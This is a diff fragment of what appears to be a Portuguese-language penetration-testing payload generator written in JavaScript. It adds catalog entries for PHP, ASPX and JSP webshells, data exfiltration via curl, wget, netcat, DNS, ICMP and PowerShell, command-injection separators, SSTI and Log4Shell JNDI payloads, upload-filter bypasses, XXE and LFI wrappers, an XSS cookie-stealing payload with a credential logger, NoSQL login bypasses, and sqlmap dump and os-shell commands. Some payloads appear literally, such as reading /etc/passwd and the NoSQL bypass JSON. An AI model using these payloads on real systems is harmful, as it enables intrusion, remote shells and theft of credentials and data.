+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - WAR JSP reverse.",
+      code: msfvenomWar(ip, port),
+      showUrl: false,
+      keywords: "msfvenom war jsp java tomcat reverse"
+    },
+    {
+      id: "webshell-php-min",
+      title: "Webshell - PHP minimo (?cmd=)",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP minimo (?cmd=).",
+      code: webshellPhpMin(),
+      showUrl: true,
+      keywords: "webshell php system get cmd web rce"
+    },
+    {
+      id: "webshell-php-post",
+      title: "Webshell - PHP via POST",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP via POST.",
+      code: webshellPhpPost(),
+      showUrl: false,
+      keywords: "webshell php post system web rce"
+    },
+    {
+      id: "webshell-php-short",
+      title: "Webshell - PHP curto shell_exec",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - PHP curto shell_exec.",
+      code: webshellPhpShort(),
+      showUrl: true,
+      keywords: "webshell php short shell_exec web rce"
+    },
+    {
+      id: "webshell-aspx-min",
+      title: "Webshell - ASPX minimo (?cmd=)",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - ASPX minimo (?cmd=).",
+      code: webshellAspxMin(),
+      showUrl: true,
+      keywords: "webshell aspx csharp windows iis web rce"
+    },
+    {
+      id: "webshell-jsp-min",
+      title: "Webshell - JSP minimo (?cmd=)",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Webshell - JSP minimo (?cmd=).",
+      code: webshellJspMin(),
+      showUrl: true,
+      keywords: "webshell jsp java tomcat web rce"
     },
     {
       id: "xss-payloads",
@@ -805,6 +1646,650 @@ function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost) {
       code: transferNcListen(port),
       showUrl: false,
       keywords: "transfer netcat nc listen receive data file"
+    },
+    {
+      id: "exfil-curl-file",
+      title: "Exfil - curl POST arquivo",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilCurlFile(ip, port, file),
+      showUrl: false,
+      keywords: "exfil exfiltracao curl post file data binary"
+    },
+    {
+      id: "exfil-wget-post",
+      title: "Exfil - wget --post-file",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilWgetPost(ip, port, file),
+      showUrl: false,
+      keywords: "exfil wget post file upload"
+    },
+    {
+      id: "exfil-nc-file",
+      title: "Exfil - nc < arquivo",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilNcFile(ip, port, file),
+      showUrl: false,
+      keywords: "exfil netcat nc file redirect"
+    },
+    {
+      id: "exfil-tar-nc",
+      title: "Exfil - tar + nc (diretorio)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilTarNc(ip, port),
+      showUrl: false,
+      keywords: "exfil tar gzip nc directory compress"
+    },
+    {
+      id: "exfil-b64-chunk",
+      title: "Exfil - base64 fatiado via curl",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilB64Chunk(ip, port, file),
+      showUrl: false,
+      keywords: "exfil base64 chunk fold curl blind post"
+    },
+    {
+      id: "exfil-python-http",
+      title: "Exfil - Python requests POST",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilPythonHttp(ip, port, file),
+      showUrl: false,
+      keywords: "exfil python requests post upload http"
+    },
+    {
+      id: "exfil-dns",
+      title: "Exfil - DNS (dig por label)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilDns(file),
+      showUrl: false,
+      keywords: "exfil dns dig base64 label covert blind"
+    },
+    {
+      id: "exfil-nslookup",
+      title: "Exfil - DNS via nslookup/certutil (Win)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilNslookup(file),
+      showUrl: false,
+      keywords: "exfil dns nslookup windows certutil blind"
+    },
+    {
+      id: "exfil-ping",
+      title: "Exfil - ICMP ping -p (hex)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilPing(file),
+      showUrl: false,
+      keywords: "exfil icmp ping hex covert blind xxd"
+    },
+    {
+      id: "exfil-ps-iwr",
+      title: "Exfil - PowerShell Invoke-WebRequest",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilPowershellFile(ip, port, file),
+      showUrl: false,
+      keywords: "exfil powershell invoke-webrequest iwr windows upload"
+    },
+    {
+      id: "exfil-ps-b64",
+      title: "Exfil - PowerShell base64 via GET",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilPowershellB64(ip, file),
+      showUrl: true,
+      keywords: "exfil powershell base64 get query cookie blind windows"
+    },
+    {
+      id: "exfil-certutil",
+      title: "Exfil - certutil -encode (Win)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilCertutilEncode(file),
+      showUrl: false,
+      keywords: "exfil certutil encode base64 windows"
+    },
+    {
+      id: "exfil-metadata",
+      title: "Exfil - Cloud metadata (SSRF)",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: exfilCurlMetadata(),
+      showUrl: true,
+      keywords: "exfil ssrf cloud metadata aws 169.254.169.254"
+    },
+    {
+      id: "rce-semicolon",
+      title: "RCE - separador ;",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceSemicolon("id"),
+      showUrl: true,
+      keywords: "rce command injection semicolon linux separator"
+    },
+    {
+      id: "rce-pipe",
+      title: "RCE - pipe |",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rcePipe("id"),
+      showUrl: true,
+      keywords: "rce command injection pipe linux"
+    },
+    {
+      id: "rce-and",
+      title: "RCE - && encadeado",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceAnd("id"),
+      showUrl: true,
+      keywords: "rce command injection and operator linux"
+    },
+    {
+      id: "rce-or",
+      title: "RCE - || fallback",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceOr("id"),
+      showUrl: true,
+      keywords: "rce command injection or operator linux"
+    },
+    {
+      id: "rce-subshell",
+      title: "RCE - subshell $()",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceSubshell("id"),
+      showUrl: true,
+      keywords: "rce command injection subshell dolar parenthesis"
+    },
+    {
+      id: "rce-backtick",
+      title: "RCE - backticks",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceBacktick("id"),
+      showUrl: true,
+      keywords: "rce command injection backtick linux"
+    },
+    {
+      id: "rce-newline",
+      title: "RCE - quebra de linha %0a",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceNewline("id"),
+      showUrl: true,
+      keywords: "rce command injection newline encoded bypass"
+    },
+    {
+      id: "rce-ifs",
+      title: "RCE - bypass de espaco ${IFS}",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: "cat${IFS}/etc/passwd",
+      showUrl: true,
+      keywords: "rce command injection ifs space bypass filter waf"
+    },
+    {
+      id: "rce-b64",
+      title: "RCE - wrapper base64 echo|bash",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceB64Wrapper("id"),
+      showUrl: true,
+      keywords: "rce base64 wrapper bypass filter waf encode"
+    },
+    {
+      id: "rce-php-system",
+      title: "RCE - PHP system($_GET)",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rcePhpSystem(),
+      showUrl: true,
+      keywords: "rce php system get web injection"
+    },
+    {
+      id: "rce-php-passthru",
+      title: "RCE - PHP passthru quebra de string",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rcePhpPassthru(),
+      showUrl: true,
+      keywords: "rce php passthru injection web"
+    },
+    {
+      id: "rce-win-amp",
+      title: "RCE - Windows &",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceWinAmp("whoami"),
+      showUrl: true,
+      keywords: "rce windows cmd amp injection"
+    },
+    {
+      id: "rce-ssti-detect",
+      title: "RCE - SSTI deteccao {{7*7}}",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceSstiDetect(),
+      showUrl: true,
+      keywords: "rce ssti jinja detection template injection 7x7"
+    },
+    {
+      id: "rce-ssti-jinja",
+      title: "RCE - SSTI Jinja2 os.popen",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceSstiJinja(),
+      showUrl: true,
+      keywords: "rce ssti jinja2 python os popen template"
+    },
+    {
+      id: "rce-ssti-bypass",
+      title: "RCE - SSTI Jinja2 via cycler",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceSstiJinjaBypass(),
+      showUrl: true,
+      keywords: "rce ssti jinja2 bypass cycler filter template"
+    },
+    {
+      id: "rce-log4j",
+      title: "RCE - Log4Shell JNDI",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceLog4j(ip, port),
+      showUrl: true,
+      keywords: "rce log4j log4shell jndi ldap java"
+    },
+    {
+      id: "rce-log4j-bypass",
+      title: "RCE - Log4Shell bypass ${::-j}",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: rceLog4jBypass(ip, port),
+      showUrl: true,
+      keywords: "rce log4j bypass waf lookup java"
+    },
+    {
+      id: "upload-htaccess",
+      title: "Upload bypass - .htaccess",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: uploadHtaccess(),
+      showUrl: false,
+      keywords: "upload bypass htaccess apache php jpg rce"
+    },
+    {
+      id: "upload-userini",
+      title: "Upload bypass - .user.ini",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: uploadUserIni(),
+      showUrl: false,
+      keywords: "upload bypass user.ini prepend php rce"
+    },
+    {
+      id: "upload-double-ext",
+      title: "Upload bypass - extensoes",
+      category: "rce",
+      categoryLabel: "RCE",
+      icon: "\udb82\udfc2",
+      subcat: "rce",
+      context: "Remote Code Execution (RCE)",
+      purpose: "Executar comandos em endpoint vulner\u00e1vel",
+      description: "Testa filtros de entrada e valida\u00e7\u00e3o de comandos no servidor.",
+      code: uploadDoubleExt(),
+      showUrl: false,
+      keywords: "upload bypass extension double phtml php5 phar rce"
+    },
+    {
+      id: "ssrf-cloud",
+      title: "SSRF - Cloud metadata",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: ssrfCloud(),
+      showUrl: true,
+      keywords: "ssrf cloud metadata aws blind request forgery"
+    },
+    {
+      id: "xxe-file",
+      title: "XXE - leitura /etc/passwd",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: xxeFile(),
+      showUrl: false,
+      keywords: "xxe xml entity file read etc passwd"
+    },
+    {
+      id: "xxe-oob",
+      title: "XXE - OOB via DTD externa",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: xxeOob(ip, port),
+      showUrl: false,
+      keywords: "xxe oob dtd external blind out of band"
+    },
+    {
+      id: "lfi-proc",
+      title: "LFI - /proc/self/environ",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: lfiProcEnviron(),
+      showUrl: true,
+      keywords: "lfi proc environ poison rce local file"
+    },
+    {
+      id: "lfi-data",
+      title: "LFI - wrapper data:// RCE",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: lfiDataWrapper(),
+      showUrl: true,
+      keywords: "lfi data wrapper php rce"
+    },
+    {
+      id: "lfi-expect",
+      title: "LFI - wrapper expect://",
+      category: "lfi",
+      categoryLabel: "LFI",
+      icon: "\udb80\ude14",
+      subcat: "lfi",
+      context: "Local File Inclusion",
+      purpose: "Ler arquivos locais atrav\u00e9s de par\u00e2metros web",
+      description: "Testa sanitiza\u00e7\u00e3o de caminhos de arquivos em par\u00e2metros de inclus\u00e3o.",
+      code: lfiExpectWrapper(),
+      showUrl: true,
+      keywords: "lfi expect wrapper command rce php"
+    },
+    {
+      id: "xss-cookie-steal",
+      title: "XSS - roubo de cookie via IMG",
+      category: "xss",
+      categoryLabel: "XSS",
+      icon: "\udb80\udd69",
+      subcat: "xss",
+      context: "Cross-Site Scripting",
+      purpose: "Testar reflex\u00e3o de script no cliente",
+      description: "Verifica se caracteres especiais (<, >, quotes) s\u00e3o codificados adequadamente na resposta HTML.",
+      code: credCaptureXss(ip, port),
+      showUrl: true,
+      keywords: "xss cookie steal session image exfil credential"
+    },
+    {
+      id: "cred-logger",
+      title: "Cred capture - servidor logger Python",
+      category: "exfil",
+      categoryLabel: "Exfil",
+      icon: "\udb80\ude0e",
+      subcat: "exfil",
+      context: "Data Exfiltration Test",
+      purpose: "Simular sa\u00edda de dados por canais alternativos",
+      description: "Transfere dados via ICMP, DNS ou HTTP para testar controles de preven\u00e7\u00e3o contra perda de dados.",
+      code: credLoggerServer(port),
+      showUrl: false,
+      keywords: "credential logger http server cookie capture xss exfil"
+    },
+    {
+      id: "nosql-ne",
+      title: "NoSQLi - $ne bypass login",
+      category: "sqli",
+      categoryLabel: "SQLi",
+      icon: "\udb80\uddbc",
+      subcat: "general",
+      context: "SQL Injection",
+      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
+      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
+      code: "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      showUrl: true,
+      keywords: "nosql mongo ne bypass injection login"
+    },
+    {
+      id: "nosql-gt",
+      title: "NoSQLi - $gt bypass",
+      category: "sqli",
+      categoryLabel: "SQLi",
+      icon: "\udb80\uddbc",
+      subcat: "general",
+      context: "SQL Injection",
+      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
+      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
+      code: "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+      showUrl: true,
+      keywords: "nosql mongo gt bypass injection"
+    },
+    {
+      id: "sqlmap-dbs",
+      title: "sqlmap - enumerar bancos",
+      category: "sqli",
+      categoryLabel: "SQLi",
+      icon: "\udb80\uddbc",
+      subcat: "general",
+      context: "SQL Injection",
+      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
+      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
+      code: "sqlmap -u 'http://TARGET/page?id=1' --batch --dbs",
+      showUrl: false,
+      keywords: "sqlmap dump dbs automate sqli"
+    },
+    {
+      id: "sqlmap-dump",
+      title: "sqlmap - dump tabela users",
+      category: "sqli",
+      categoryLabel: "SQLi",
+      icon: "\udb80\uddbc",
+      subcat: "general",
+      context: "SQL Injection",
+      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
+      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
+      code: "sqlmap -u 'http://TARGET/page?id=1' --batch -D db -T users --dump",
+      showUrl: false,
+      keywords: "sqlmap dump table users automate sqli"
+    },
+    {
+      id: "sqlmap-osshell",
+      title: "sqlmap - --os-shell",
+      category: "sqli",
+      categoryLabel: "SQLi",
+      icon: "\udb80\uddbc",
+      subcat: "general",
+      context: "SQL Injection",
+      purpose: "Bypass de autentica\u00e7\u00e3o e consulta de tabelas",
+      description: "Injeta operadores e coment\u00e1rios para alterar a l\u00f3gica de consultas SQL.",
+      code: "sqlmap -r req.txt --batch --os-shell",
+      showUrl: false,
+      keywords: "sqlmap os-shell rce automate sqli"
     },
     {
       id: "lfi-traversal",
